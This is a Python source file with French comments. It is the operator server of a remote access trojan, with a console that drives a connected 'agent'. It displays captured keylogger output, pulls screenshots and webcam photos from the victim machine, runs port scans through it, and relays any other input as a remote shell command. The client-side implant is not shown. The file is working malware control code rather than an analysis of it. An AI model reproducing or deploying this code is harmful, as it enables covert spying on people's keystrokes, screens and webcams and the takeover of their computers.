import socket
import threading
import time

ip_address = '0.0.0.0'
port_number = 1234
keylog_file = "keylog.txt"

def afficher_ascii_art(filepath):
    """
    Lit et affiche un fichier contenant de l'ASCII art avec coloration spécifique pour les caractères +, -, ., :, =, *, et @.
    L'affichage se fait progressivement ligne par ligne.
    :param filepath: Chemin du fichier contenant l'art ASCII.
    """
    try:
        with open(filepath, "r", encoding="utf-8") as file:
            print("\n" + "=" * 80)
            for line in file:
                # Supposons que la frontière entre les formes est à la moitié de la ligne
                middle_index = len(line) // 2
                left_part = (line[:middle_index]
                             .replace('+', '\033[31m+\033[0m')
                             .replace('-', '\033[31m-\033[0m')
                             .replace('.', '\033[31m.\033[0m')
                             .replace(':', '\033[31m:\033[0m')
                             .replace('=', '\033[31m=\033[0m')
                             .replace('*', '\033[31m*\033[0m')
                             .replace('@', '\033[30m@\033[0m'))
                right_part = (line[middle_index:]
                              .replace('+', '\033[35m+\033[0m')
                              .replace('-', '\033[35m-\033[0m')
                              .replace('.', '\033[35m.\033[0m')
                              .replace(':', '\033[35m:\033[0m')
                              .replace('=', '\033[35m=\033[0m')
                              .replace('*', '\033[35m*\033[0m')
                              .replace('@', '\033[30m@\033[0m'))
                # Affichage progressif de la ligne
                print(left_part + right_part, end='', flush=True)
                time.sleep(0.1)  # Délai rapide entre les lignes
            print("\n" + "=" * 80)
    except FileNotFoundError:
        print(f"Erreur : Le fichier {filepath} est introuvable.")
    except Exception as e:
        print(f"Erreur lors de la lecture de l'art ASCII : {e}")

def handle_connection(connection, address):
    # Affiche l'ASCII art lorsqu'une connexion est établie
    afficher_ascii_art("dracaufeu.txt")
    print(f"Connexion établie avec {address}")

    help_text = (
        "\033[1;34m"
        "┌───────────────────────────────────────────────────────────┐\n"
        "│                    Commandes disponibles                  │\n"
        "├───────────────────────────────────────────────────────────┤\033[0m\n"
        "│ \033[1;32mexit\033[0m          : Ferme la connexion avec le client.          │\033[0m\n"
        "│ \033[1;32mkeylog\033[0m        : Affiche les frappes enregistrées par le keylogger. │\033[0m\n"
        "│ \033[1;32mscreenshot\033[0m    : Prend une capture d'écran de l'agent et l'enregistre sur le serveur.   │\033[0m\n"
        "│ \033[1;32mwebcam\033[0m        : Prend une photo avec la webcam de l'agent et l'enregistre sur le serveur..              │\033[0m\n"
        "│ \033[1;32mscan <start> <end>\033[0m : Scanne les ports dans une plage donnée. │\033[0m\n"
        "│ \033[1;32mhelp\033[0m          : Affiche cette aide.                          │\033[0m\n"
        "\033[1;34m"
        "└───────────────────────────────────────────────────────────┘\033[0m"
    )

    while True:
        try:
            command = input("Entrer une commande à exécuter ('exit' ou 'help' pour commencer) : ")

            if command.lower() == 'exit':
                connection.send(b'quit')
                break

            elif command.lower() == 'help':
                print(help_text)
                continue

            elif command.lower() == 'keylog':
                try:
                    with open(keylog_file, "r") as keylog:
                        print(f"Contenu du Keylogger :\n{keylog.read()}")
                except FileNotFoundError:
                    print("Aucun fichier keylog trouvé.")

            elif command.lower() == 'screenshot' or command.lower() == 'webcam':
                connection.send(command.encode())

                img_size = int(connection.recv(1024).decode())
                connection.send(b'OK')

                img_data = b''
                while len(img_data) < img_size:
                    packet = connection.recv(4096)
                    if not packet:
                        break
                    img_data += packet

                if command.lower() == 'screenshot':
                    with open("screenshot.png", "wb") as f:
                        f.write(img_data)
                    print("\u001B[32m✅\u001B[0m Capture d'écran reçue et sauvegardée sous 'screenshot.png'.")
                else:
                    with open("webcam.png", "wb") as f:
                        f.write(img_data)
                    print("\u001B[32m✅\u001B[0m Photo de la webcam reçue et sauvegardée sous 'webcam_image.png'.")

            elif command.startswith('scan'):
                parts = command.split()
                if len(parts) != 3:
                    print("\u001B[31m❌\u001B[0m  Erreur : commande mal formée. Utilisez : scan <start_port> <end_port>")
                    continue

                connection.send(command.encode())
                print("Scan en cours...")
                response = connection.recv(4096).decode()
                print(f"\u001B[34mℹ️\u001B[0m  Résultat du scan :\n{response}")
                continue

            elif command.lower() == 'pop_ascii':
                afficher_ascii_art("dracaufeu.txt")
                continue

            else:
                connection.send(command.encode())
                response = connection.recv(4096).decode()
                if not response:
                    break
                print(f"Output:\n{response}")
        except Exception as e:
            print(f"Error: {e}")
            break

    connection.close()

def start_server():
    """
    Fonction pour établir une connexion avec l'agent.
    """
    ss = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ss.bind(('0.0.0.0', 1234))
    ss.listen(5)
    print(f"Serveur en écoute sur {ip_address}:{port_number}")

    while True:
        connection, address = ss.accept()
        thread = threading.Thread(target=handle_connection, args=(connection, address))
        thread.start()

if __name__ == "__main__":
    start_server()
